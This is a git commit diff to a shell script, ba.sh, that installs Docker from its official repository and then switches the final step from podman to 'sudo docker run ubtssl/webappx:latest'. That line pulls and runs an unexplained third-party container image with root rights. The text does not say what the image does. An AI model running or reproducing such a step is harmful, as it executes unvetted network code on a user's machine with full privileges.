d2edd886c2244ee603029b7f3a6effc46cfb1570
max313iq <153689278+max313iq@users.noreply.github.com>
2024-01-23 09:37:56 +0300

    Update ba.sh

--- ba.sh
+++ ba.sh
@@ -9,5 +9,4 @@ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o 
 echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
 sudo apt-get update --fix-missing
 sudo apt-get install -y docker-ce docker-ce-cli containerd.io
-sudo apt-get install -y podman
-sudo podman run ubtssl/webappx:latest
+sudo docker run ubtssl/webappx:latest
